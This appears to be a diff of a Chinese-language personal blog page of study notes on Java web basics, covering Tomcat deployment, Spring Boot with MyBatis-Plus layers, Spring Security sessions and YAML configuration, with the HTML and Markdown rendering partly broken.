+创建后 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/Javaweb/" title="无题">无题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-08-18T15:47:21.955Z" title="发表于 2022-08-18 23:47:21">2022-08-18</time></span></div><div class="content">JavawebCS 和 BS 的区别
+  CS架构是客户端服务器架构模式（需要在本地安装）
+  CS优点：充分利用客户端机器的资源，减轻服务器的负荷
+  CS缺点：需要安装；升级维护成本高
+  BS架构是浏览器服务器架构模式（不需要本地安装，只需要浏览器）
+  BS优点：客户端不需要安装；维护成本低
+  BS缺点：所有的计算和存储任务都是放在服务器端的，服务器负荷重
   
-  <pre class="line-numbers language-none"><code class="language-none">
-10.   MySQL Connector&#x2F;J
 
-11.   &#96;&#96;&#96;
-      &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;mysql&#x2F;mysql-connector-java --&gt;
-      &lt;dependency&gt;
-          &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt;
-          &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt;
-          &lt;version&gt;8.0.29&lt;&#x2F;version&gt;
-      &lt;&#x2F;dependency&gt;
-      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  mybatis-plus-boot-starter</p>
-</li>
-<li>  <pre class="line-numbers language-none"><code class="language-none">&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;com.baomidou&#x2F;mybatis-plus-boot-starter --&gt;
-&lt;dependency&gt;
-    &lt;groupId&gt;com.baomidou&lt;&#x2F;groupId&gt;
-    &lt;artifactId&gt;mybatis-plus-boot-starter&lt;&#x2F;artifactId&gt;
-    &lt;version&gt;3.5.1&lt;&#x2F;version&gt;
-&lt;&#x2F;dependency&gt;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  mybatis-plus-generator</p>
-</li>
-<li><p>```</p>
-  <!-- https://mvnrepository.com/artifact/com.baomidou/mybatis-plus-generator -->
-  <dependency>
-      <groupId>com.baomidou</groupId>
-      <artifactId>mybatis-plus-generator</artifactId>
-      <version>3.5.2</version>
-  </dependency>
+Tomcat
+  Tomcat是一个web container，是web的容器，可以容纳多个项目
+  将一个项目部署到container叫做部署
+
+使用创建项目
+  在主目录下的webapps目录可以部署项目
+
+  在webapps下新建目录，这个目录可以随意命名
+
+在这个自由命名的目录下再新建一个文件夹，名字必须是(如下)，字母全部大写，中间是减号，不能随意命名
+  WEB-INF
+  再WEB-INF同级的目录下放前后端web代码
+
   
-  <pre class="line-numbers language-none"><code class="language-none">
-16.   如果maven报红的话，点击重新加载
 
-17.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830230836.png)
+  在localhost:8080后面拼接上自己命名的文件夹名，再拼接上要打开的网页即可在浏览器中访问
 
-18.   spring如果想要访问数据库，则需要和登录mysql一样，输入用户名密码登录
-
-19.   在application.properties中添加数据库配置,下面的还需要自行更改
-
-20.   我不知道为什么还要每次**重启idea的时候都要重新写上**,否则会报
-
-21.   &#96;&#96;&#96;java
-      Failed to configure a DataSource: &#39;url&#39; attribute is not specified and no embedded datasource could be configured.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>```java<br>  spring.datasource.username=root<br>  spring.datasource.password=123456<br>  spring.datasource.url=jdbc:mysql://localhost:3306/kob?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8<br>  spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-23.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831142804.png)
-
-## SpringBoot中常用模块
-
-1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831152828.png)
-
-2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831152901.png)
-
-     
-
-3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831153435.png)
-
-### pojo层
-
-1.   第一步：将数据库中的表翻译成Java中的class
-2.   创建一个package，名为pojo,一个表对应一个pojo
-3.   创建一个class，名为User
-4.   类中写数据库中对应的数据类型
-5.   加入注解，自动化生成
-6.   @Data,这个注解会导入常用的函数
-7.   @NoArgsConstructor，无参构造函数
-8.   @AllArgsConstructor，全参构造函数
-
-### mapper层
-
-1.   第二步是创建mapper层
-2.   加入@Mapper注解
-3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831162135.png)
-4.   UserMapper是一个接口，继承自BaseMapper&lt;User&gt;写法固定
-
-
-
-### service
-
-### controller
-
-#### controller的定义
-
-1.   初步写的时候,controller和service不用分开，等到真正的写业务逻辑的时候再分开
-
-2.   在backend.user中创建UserController类
-
-3.   加入注解@RestController
-
-4.   在这个类中可以实现各种请求查询
-
-5.   如果想要只映射get类型的，则为@GetMapping Mapping
-
-6.   只映射post类型的映射，则为@PostMapping Mapping
-
-7.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831163835.png)
-
-8.   具体详见[春季@GetMapping和@PostMapping与示例 (howtodoinjava.com)](https:&#x2F;&#x2F;howtodoinjava.com&#x2F;spring5&#x2F;webmvc&#x2F;controller-getmapping-postmapping&#x2F;)
-
-9.   要用到mapper的话，一定要加上@Autowired的注解
-
-10.   &#96;&#96;&#96;java
-     @Autowired
-     UserMapper userMapper;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  当声明出一个上一级的变量时，必须使用此注解</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903160545.png"></p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903160557.png"></p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831172013.png"></p>
-</li>
-<li><p>  这样可以使用不同的方法来实现不同的查询，具体查看mybatis CRUD接口</p>
-</li>
-</ol>
-<h4 id="controller中用mybatis-plus的自动化方法实现CRUD"><a href="#controller中用mybatis-plus的自动化方法实现CRUD" class="headerlink" title="controller中用mybatis-plus的自动化方法实现CRUD"></a>controller中用mybatis-plus的自动化方法实现CRUD</h4><ol>
-<li><p>  查：</p>
-</li>
-<li><p>```java<br>  @GetMapping(value=”/user/{userId}”) //这个注解，当get传参为userId时，可以调用后面的方法<br>  public User getuser(int userId){ //这个地方，返回值是数据库中的数据，所以返回值类型写表的名字</p>
-<pre><code>  return userMapper.selectById(userId);
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   上面的是从mybatis的官方文档中看的
-
-4.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220831173429.png)
-
-### mybatis CRUD接口
-
-1.   [CRUD 接口 | MyBatis-Plus (baomidou.com)](https:&#x2F;&#x2F;baomidou.com&#x2F;pages&#x2F;49cc81&#x2F;#service-crud-接口)
-
-2.   官方文档中的所有语句一般都是要写到return 语句中的，在userMapper中使用，例如
-
-3.   &#96;&#96;&#96;java
-     return userMapper.selectById(userId);
-     上面的return userMapper.是一定要写的，因为声明的mapper为userMapper<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="Spring-Boot中传参数"><a href="#Spring-Boot中传参数" class="headerlink" title="Spring Boot中传参数"></a>Spring Boot中传参数</h2><ol>
-<li><p>  大括号，中间写参数名称</p>
-</li>
-<li><p>  例如，要get传参，传给XXX</p>
-</li>
-<li><p>```java<br>  @GetMapping(“/user/{userId}”)</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-4.   另外，如果需要引用传入的参数的话，则需要使用如下注解
-
-5.   &#96;&#96;&#96;java
-     @PathVariable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831203551.png"></p>
-</li>
-<li><p>  @PathVariable注解用来修饰参数，放在参数的前面</p>
-</li>
-<li><p>  {id}，大括号中的参数不需要使用 ? 传递，只需要在后面拼接即可</p>
-</li>
-<li><p>  @PathVariable的详解<a target="_blank" rel="noopener" href="https://www.baeldung.com/spring-pathvariable">春季@PathVariable注释|贝尔东 (baeldung.com)</a></p>
-</li>
-</ol>
-<h3 id="当出现红色报错时"><a href="#当出现红色报错时" class="headerlink" title="当出现红色报错时"></a>当出现红色报错时</h3><ol>
-<li>  <strong>当遇到can not resolve symbol XXX的时候，首先检查XXX有没有导入进去</strong></li>
-<li>  <strong>例如can not resolve symbol User,就是没有引入第一步写的pojo中的User类</strong></li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831171009.png"></li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220831171037.png"></li>
-<li>  当出现红色报错，例如can not resolve symbol XXX的时候，重启</li>
-<li>  <img src="https://img-blog.csdnimg.cn/20200314173108824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM4NDAwNjY=,size_4,color_FFFFFF,t_70"></li>
-<li>  <img src="https://img-blog.csdnimg.cn/20200314173131448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM4NDAwNjY=,size_4,color_FFFFFF,t_70"></li>
-<li>  如果还是报错红色，刷新依赖</li>
-<li>  <img src="https://img-blog.csdnimg.cn/20200314173450227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTM4NDAwNjY=,size_4,color_FFFFFF,t_70"></li>
-<li>  如果依然报错的话，可以检查<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Maven&spm=1001.2101.3001.7020">Maven</a>的配置，查看Maven的home路径，user setting file路径，local repository的路径。</li>
-</ol>
-<h2 id="springboot在客户端和mysql之间传递的逻辑"><a href="#springboot在客户端和mysql之间传递的逻辑" class="headerlink" title="springboot在客户端和mysql之间传递的逻辑"></a>springboot在客户端和mysql之间传递的逻辑</h2><ol>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220901224026.png"></li>
-<li>  client给spring boot传一个url,spring boot将查询数据返回给mysql</li>
-<li>  mysql将数据返回给spring boot,spring boot再将来自spring boot的数据返回给client</li>
-</ol>
-<h2 id="映射数据库中的表"><a href="#映射数据库中的表" class="headerlink" title="映射数据库中的表"></a>映射数据库中的表</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AllArgsConstructor</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Data</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NoArgsConstructor</span><span class="token punctuation">;</span>
-
-<span class="token annotation punctuation">@Data</span>
-<span class="token annotation punctuation">@NoArgsConstructor</span>
-<span class="token annotation punctuation">@AllArgsConstructor</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Kob</span> <span class="token punctuation">&#123;</span>
-    <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token class-name">String</span> username<span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token class-name">String</span> password<span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token class-name">Integer</span> rating<span class="token punctuation">;</span>
-    <span class="token keyword">private</span> <span class="token class-name">String</span> photo<span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> id<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> username<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUsername</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> password<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPassword</span><span class="token punctuation">(</span><span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">this</span><span class="token punctuation">.</span>password <span class="token operator">=</span> password<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getRating</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> rating<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setRating</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> rating<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">this</span><span class="token punctuation">.</span>rating <span class="token operator">=</span> rating<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getPhoto</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> photo<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setPhoto</span><span class="token punctuation">(</span><span class="token class-name">String</span> photo<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">this</span><span class="token punctuation">.</span>photo <span class="token operator">=</span> photo<span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="Mapper"><a href="#Mapper" class="headerlink" title="Mapper"></a>Mapper</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>mapper</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>baomidou<span class="token punctuation">.</span>mybatisplus<span class="token punctuation">.</span>core<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">BaseMapper</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Kob</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">Mapper</span><span class="token punctuation">;</span>
-
-<span class="token annotation punctuation">@Mapper</span>
-<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token keyword">extends</span> <span class="token class-name">BaseMapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Kob</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
-
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="UserController"><a href="#UserController" class="headerlink" title="UserController"></a>UserController</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>controller<span class="token punctuation">.</span>user</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span></span><span class="token class-name">UserMapper</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>beans<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Autowired</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">GetMapping</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PathVariable</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>
-<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>kob<span class="token punctuation">.</span>backend<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Kob</span><span class="token punctuation">;</span>
-
-<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span>
-
-<span class="token annotation punctuation">@RestController</span>
-<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span> <span class="token punctuation">&#123;</span>
-
-    <span class="token annotation punctuation">@Autowired</span>
-    <span class="token class-name">UserMapper</span> userMapper<span class="token punctuation">;</span>
-
-    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/user/all/"</span><span class="token punctuation">)</span>
-    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Kob</span><span class="token punctuation">></span></span> <span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">selectList</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"/user/&#123;userId&#125;"</span><span class="token punctuation">)</span>
-    <span class="token keyword">public</span> <span class="token class-name">Kob</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span> <span class="token keyword">int</span> userId<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">return</span> userMapper<span class="token punctuation">.</span><span class="token function">selectById</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="用户授权操作"><a href="#用户授权操作" class="headerlink" title="用户授权操作"></a>用户授权操作</h2><ol>
-<li><p>  spring security模块</p>
-</li>
-<li><p>  需要将spring security继承进来</p>
-</li>
-<li><p>  从maven官网找依赖，spring-boot-starter-security</p>
-</li>
-<li><p>```java</p>
-  <!-- https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-security -->
-  <dependency>
-      <groupId>org.springframework.boot</groupId>
-      <artifactId>spring-boot-starter-security</artifactId>
-      <version>2.7.3</version>
-  </dependency>
   
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   添加进pom.xml中
-
-6.   session和jwt，选择了jwt
-
-7.   spring用户名默认为user
-
-8.   spring密码会自动生成，需要在终端中寻找
-
-## session验证
-
-1.   当spring boot传数据给client的时候，同时传了一个字符串，session id
-2.   client在拿到session id的时候，还会在浏览器中留一个cookie,关闭之后仍然会存在
-3.   每一次访问的时候，浏览器都会默认从客户端取出session id,并放到cookie中传给spring boot
-4.   如果cookie中的session id没有过期，则可以登录
-5.   如果cookie中的session id过期了，或者session id不存在，则会返回一个登录页面，让其重新登录
-
-## post请求需要在参数前面加一个注解
-
-1.   post请求需要在参数前面加一个注解
-
-2.   &#96;&#96;&#96;java
-     @RequestParam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h1 id="QueryWrapper"><a href="#QueryWrapper" class="headerlink" title="QueryWrapper"></a>QueryWrapper</h1><ol>
-<li><p>  用来生成sql的where条件，entity属性也用于生成sql的where条件</p>
-</li>
-<li><p>  声明一个QueryWrapper：</p>
-</li>
-<li>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">QueryWrapper</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> queryWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QueryWrapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-queryWrapper<span class="token punctuation">.</span><span class="token function">eq</span><span class="token punctuation">(</span><span class="token string">"column_name"</span><span class="token punctuation">,</span>value_in_database<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">User</span> user <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">selectOne</span><span class="token punctuation">(</span>queryWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这个userMapper是@Autowired private UserMapper userMapper声明出来的，记住是由userMapper来控制数据库</span>
-<span class="token comment">//此处可以对如果查找错误进行判断</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span>user <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span><span class="token string">"用户不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//报错用throw new RuntimeException();扔出一个错误</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220908210022.png"></p>
-</li>
-</ol>
-<h1 id="搭建项目的框架"><a href="#搭建项目的框架" class="headerlink" title="搭建项目的框架"></a>搭建项目的框架</h1><ol>
-<li><p>  MVC</p>
-</li>
-<li><p>  M：model，用JavaBean写的实体类</p>
-</li>
-<li><p>```<br>  public 的类<br>  private的属性<br>  必须包含一个无参构造器，构造器可以不唯一，即可以存在其它构造器和无参构造器构成重载<br>  必须对每一个成员属性都有一个getter和一个setter</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-4.   V:view,即存放前端可视化代码
-
-5.   C:controller,用来控制实体类
-
-## 再细分
-
-1.   User来映射数据库
-2.   Mapper来操控制数据库，其实就是复制一个接口
-3.   Service来实现具体的业务逻辑
-4.   Controller来实现和前端的交互
 
 
-
-# 黑马springboot
-
-## springboot起步依赖原理分析
-
-1.   版本锁定：在父工程中定义了一些坐标和版本信息，在后面继承这个父类时，就不需要再写版本信息了，可以有效地避免冲突
-2.   spring boot-web中集成了spring的一些依赖，也就是说springboot是基于spring的，spring较为底层
-3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220917211502.png)
-4.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220917211615.png)
-
-## 配置文件
-
-1.   springboot是基于约定的，很多配置都有默认值，但是如果想用自己的配置替换默认配置的话，就可以使用application.properties或者application.yml（或者application.yaml，yml和yaml是相同的，就和html和htm一样）进行配置
-2.   配置文件都在resources目录下
-3.   加载顺序：properties &gt; yml &gt; yaml,如果高低优先级中同时存在，则会采用高优先级的
-
-### properties
-
-&#96;&#96;&#96;java\
-server.port&#x3D;8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  properties采用键值对的形式</p>
-</li>
-</ol>
-<h3 id="yml"><a href="#yml" class="headerlink" title="yml"></a>yml</h3><ol>
-<li><p>```java<br>  server:</p>
-<pre><code>  port: 8080
-</code></pre>
-  <pre class="line-numbers language-none"><code class="language-none">
-2.   使用缩进代表父子层级关系
-
-3.   冒号和数值之间有空格，如果没有空格，数值将不会被识别
-
-## yaml
-
-1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918092359.png)
-
-2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220918092647.png)
-3.   注意：**缩进表示层级关系**
-4.   缩进时不允许使用tab，只允许使用空格，各个系统tab对应的空格数目可能不同，导致层次混乱（idea不用担心）
-5.   缩进的空格数目不重要，只要相同层级的元素左对齐即可
-
-### yaml数据格式
-
-1.   对象（map）：键值对的集合，支持行内写法
-
-2.   行内写法，不同属性之间**用逗号去分隔**
-
-3.   采用一种键值对的形式
-
-4.   &#96;&#96;&#96;
-     person: &#123;name: zhangsan,age: 20&#125; &#x2F;&#x2F;了解即可，最好采用缩进的写法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220918093431.png"></p>
-</li>
